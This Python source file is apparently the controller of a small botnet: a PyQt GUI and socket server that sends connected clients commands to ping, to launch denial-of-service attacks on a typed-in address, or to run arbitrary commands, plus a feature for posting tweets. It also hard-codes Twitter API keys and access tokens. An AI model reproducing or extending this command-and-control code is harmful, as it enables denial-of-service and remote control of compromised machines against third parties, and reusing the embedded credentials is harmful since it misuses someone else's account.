# server.py
import sys
import os
import socket
import time
import traceback
import tweepy
from threading import Thread
from PyQt5 import QtCore, QtGui, QtWidgets, uic

# Global Variables
client_IP = []
number_of_connections = 0
command = 'no'
address = ''
cmd = ''
last_tweet = ''
Online = False

# PyQt
qtCreatorFile = "controllerGUI.ui"
Ui_MainWindow, QtBaseClass = uic.loadUiType(qtCreatorFile)


class TwitterAPI:
    def __init__(self):
        consumer_key = "kE2qKHbUyIP7eFZwpiQFcDS18"
        consumer_secret = "2C5QP9QtJxprydZjw2VjTDL2O2Jc1SExNqrpm5XeUWaSeAmfqS"
        auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
        access_token = "843786300188704768-2zFNwekrzOWHNOAoxYphVdQEKo0Nh6Q"
        access_token_secret = "Mq3Cz5s0l3UhDaBcptzUBw8CCJm6i7oqM6IQCmqWV8GPK"
        auth.set_access_token(access_token, access_token_secret)
        self.api = tweepy.API(auth)

    def get_tweet(self):
        tweet = self.api.home_timeline(id=self.api, count=1)[0]
        print(tweet.text)

    def create_tweet(self, input):
        self.api.update_status(input)


class controllerGUI(QtWidgets.QDialog, Ui_MainWindow):
    def __init__(self):
        QtWidgets.QDialog.__init__(self)
        Ui_MainWindow.__init__(self)
        self.setupUi(self)
        self.addBtn.clicked.connect(self.showConnectionList)
        self.pingButton.clicked.connect(self.command_ping)
        self.dosButton.clicked.connect(self.command_dos)
        self.messageButton.clicked.connect(self.command_cmd)
        self.tweetButton.clicked.connect(self.command_tweet)
        self.stopButton.clicked.connect(self.command_stop)

    def showConnectionList(self):
        global number_of_connections, Online
        Online = True
        counter = number_of_connections
        self.listWidget.clear()

        if counter >= 0:
            for counter in range(0, counter, 1):
                txt = client_IP[counter]
                self.listWidget.addItem(txt)
                txt = "Connected!"
                self.highlightedConnection.setText(txt)



    def command_ping(self):
        global command, address
        input_address = self.input_address.text()

        if input_address == "":
            self.highlightedConnection.setText("Invalid Address")
        else:
            command = 'ping'
            address = input_address
            self.highlightedConnection.setText("Pinging {}...".format(address))
            self.input_address.clear()
        print("address set {}".format(address))


    def command_dos(self):
        global command, address
        input_address = self.input_dos.text()

        if input_address == "":
            self.highlightedConnection.setText("Invalid Address")
        else:
            command = 'dos'
            address = input_address
            self.highlightedConnection.setText("DoSing {}...".format(address))
            self.input_dos.clear()
        print("address set {}".format(address))


    def command_cmd(self):
        global command, cmd
        input_command = self.input_command.text()
        if input_command == "":
            self.highlightedConnection.setText("Invalid Command")
        else:
            command = 'cmd'
            cmd = input_command
            self.input_command.clear()

    def command_tweet(self):
        global last_tweet
        input_tweet = self.input_tweet.text()
        if input_tweet == "":
            self.highlightedConnection.setText("Invalid Command")
        else:
            if input_tweet != last_tweet:
                twitter.create_tweet(input_tweet)
                self.highlightedConnection.setText("TWEET SENT!")
                last_tweet = input_tweet
                self.input_tweet.clear()
            else:
                self.highlightedConnection.setText("Repeated Tweet!")
                self.input_tweet.clear()

    def command_stop(self):
        global command
        self.highlightedConnection.setText("Awaiting command")
        print("STOPPED")
        command = 'stop'


def client_thread(conn, ip, port, MAX_BUFFER_SIZE = 4096):
    global command, address, cmd, tweet, client_IP, number_of_connections

    # size check
    input_from_client_bytes = conn.recv(MAX_BUFFER_SIZE)
    siz = sys.getsizeof(input_from_client_bytes)
    if siz >= MAX_BUFFER_SIZE:
        print("The length of input is probably too long: {}".format(siz))

    # decode input
    input_from_client = input_from_client_bytes.decode("utf8").rstrip()
    print("Command received: {}".format(input_from_client))
    # reply
    # res = input("What you want to reply?\n")
    # wait for command
    res = command
    while res == 'no':
        print('waiting for command...')
        # wait 3 seconds
        time.sleep(3)
        # update res
        res = command

    resCheck = res.encode("utf8")  # encode the result string
    print("Sent back: " + res)
    conn.sendall(resCheck)  # send it to client

    if res == 'ping':
        # reply
        # res = input("What address?\n")
        res = address
        resCheck = res.encode("utf8")  # encode the result string
        print("Sent address: " + res)
        conn.sendall(resCheck)  # send it to client

    if res == 'dos':
        # reply
        # res = input("What address?\n")
        res = address
        resCheck = res.encode("utf8")  # encode the result string
        print("Sent address: " + res)
        conn.sendall(resCheck)  # send it to client

    if res == 'cmd':
        # reply
        # res = input("What address?\n")
        res = cmd
        resCheck = res.encode("utf8")  # encode the result string
        print("Sent command: " + res)
        conn.sendall(resCheck)  # send it to client



    number_of_connections = number_of_connections - 1
    client_IP.remove(ip + ':' + port)
    conn.close()  # close connection
    print('Connection ' + ip + ':' + port + " ended")


def start_server():

    # Global Variables
    global number_of_connections, client_IP, command

    while Online == False:
        time.sleep(1)

    # declare socket
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # this is for easy starting/killing the app
    soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print('Socket created')

    try:
        soc.bind(("127.0.0.1", 12345))
        print('Socket bind complete')
    except socket.error as msg:
        print('Bind failed. Error : ' + str(sys.exc_info()))
        sys.exit()

    #Start listening on socket
    soc.listen(100)
    print('Socket now listening')

    # infinite loop for server
    while True:

        conn, addr = soc.accept()
        ip, port = str(addr[0]), str(addr[1])
        print('Accepting connection...')
        client_IP.append(ip + ':' + port)
        print("Connection {} has the IP: {}".format(number_of_connections, client_IP[number_of_connections]))
        number_of_connections = number_of_connections + 1
        try:
            Thread(target=client_thread, args=(conn, ip, port)).start()
        except:
            print("error!")
            traceback.print_exc()
    soc.close()


if __name__ == "__main__":
    twitter = TwitterAPI()
    try:
        Thread(target=start_server).start()
    except:
        print("error starting server!")
        traceback.print_exc()

    app = QtWidgets.QApplication(sys.argv)
    window = controllerGUI()
    window.show()
    sys.exit(app.exec_())


